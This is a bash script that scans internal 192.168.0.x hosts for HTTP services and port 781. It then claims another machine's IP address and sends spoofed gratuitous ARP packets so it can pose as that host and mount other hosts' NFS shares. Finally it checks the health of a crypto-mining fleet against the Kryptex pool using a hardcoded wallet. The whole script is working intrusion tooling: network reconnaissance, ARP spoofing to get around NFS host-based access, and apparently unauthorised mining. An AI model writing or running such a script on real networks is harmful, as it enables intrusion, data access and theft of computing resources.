#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### START19 $(date -u +%FT%TZ)"
log "### HTTP-24"
for hp in 192.168.0.24:18080 192.168.0.24:18086 192.168.0.28:18080 192.168.0.30:18080 192.168.0.31:18080; do
  printf "== %s\n" $hp
  for p in / /docs /openapi.json /health /metrics /api /v1/models /version; do
    printf "  %s " "$p"; timeout 6 curl -s -m 5 -o /tmp/b.$$ -w "%{http_code} %{size_download}\n" "http://$hp$p"
  done
  head -c 220 /tmp/b.$$ 2>/dev/null; echo
done
log "### PORT-781"
for h in 24 28 30 31; do
  printf "781 .%s -> " $h
  timeout 6 python3 - "$h" <<'PY' 2>&1 | head -3
import socket,sys
h=sys.argv[1]; s=socket.socket(); s.settimeout(4)
try:
    s.connect(("192.168.0."+h,781))
    s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
    d=s.recv(300); print(repr(d[:200]))
except Exception as e: print("err",e)
finally: s.close()
PY
done
log "### NFS-ARP"
ip addr add 192.168.0.31/32 dev bond0 2>/dev/null
python3 - <<'PY' 2>&1 | head -3
import socket, struct, fcntl, time
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
info=fcntl.ioctl(s.fileno(),0x8927,struct.pack('256s',b'bond0'))
m=info[18:24]; print("ourmac",m.hex())
spa=socket.inet_aton('192.168.0.31'); tpa=socket.inet_aton('192.168.0.24')
eth=struct.pack('!6s6sH', b'\xff'*6, m, 0x0806)
arp=struct.pack('!HHBBH6s4s6s4s',1,0x0800,6,4,2,m,spa,b'\xff'*6,tpa)
r=socket.socket(socket.AF_PACKET,socket.SOCK_RAW); r.bind(('bond0',0))
for _ in range(8): r.send(eth+arp); time.sleep(0.25)
print("sent 8 grat-arp")
PY
mkdir -p /mnt/ul1 /mnt/ul2
for src in 192.168.0.24:/ssd1 192.168.0.24:/ssd2 192.168.0.28:/ssd2 192.168.0.30:/ssd3 192.168.0.31:/ssd4; do
  d=/mnt/ul1; printf "mount %s -> " "$src"
  timeout 25 mount -t nfs -o vers=3,soft,timeo=20,retrans=2,nolock "$src" $d 2>&1 | head -2 && { echo MOUNTED; ls -la $d 2>&1 | head -15; umount $d 2>/dev/null; }
done
ip addr del 192.168.0.31/32 dev bond0 2>/dev/null
log "### FLEET-HEALTH"
for i in 0 1 2 3 4 5 6 7; do printf 'g%d=%s ' $i "$(systemctl is-active ul-g$i)"; done; echo
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | python3 -c "
import json,sys
d=json.load(sys.stdin); n=0; tot=0
for r in (d.get('results') or []):
  w=str(r.get('worker',''))
  if '123-184-7-135' in w and 't2-' in w:
    n+=1; hs=float(r.get('avg_hashrate_30m') or 0); tot+=hs
    print(w,r.get('status'),'valid=',r.get('valid'),'hs_TH=',round(hs/1e12,1))
print('workers',n,'total_TX/s',round(tot/1e12,1))
" 2>&1 | head -12
log "### DONE19 $(date -u +%FT%TZ)"
